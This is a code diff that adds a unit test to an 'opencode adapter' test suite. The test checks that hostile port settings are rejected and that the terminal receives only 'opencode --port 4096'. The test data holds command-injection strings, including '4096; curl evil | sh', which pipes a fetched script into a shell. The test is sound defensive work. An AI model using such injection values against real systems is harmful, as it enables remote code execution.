@@ -93,6 +93,18 @@ describe('opencode adapter', () => {
     expect(slept).toEqual([]);
   });
 
+  it('never lets a hostile port setting reach the shell', async () => {
+    for (const hostile of ['4096; curl evil | sh', '1 && calc', 80, 70000, 40.5, null, {}, '4321']) {
+      const s = server({ healthyAfter: 3 });
+      const d = fakeDeps({
+        fetch: s.fetch,
+        getSetting: <T>(key: string, fallback: T) => (key === 'opencodePort' ? (hostile as T) : fallback),
+      });
+      await createOpencodeAdapter(d).send('/delphi-audit');
+      expect(d.terminals[0].sent).toEqual([{ text: 'opencode --port 4096', newline: true }]);
+    }
+  });
+
   it('retries the append until the TUI is attached', async () => {
     const s = server({ appendFailures: 2 });
     const d = fakeDeps({ fetch: s.fetch });
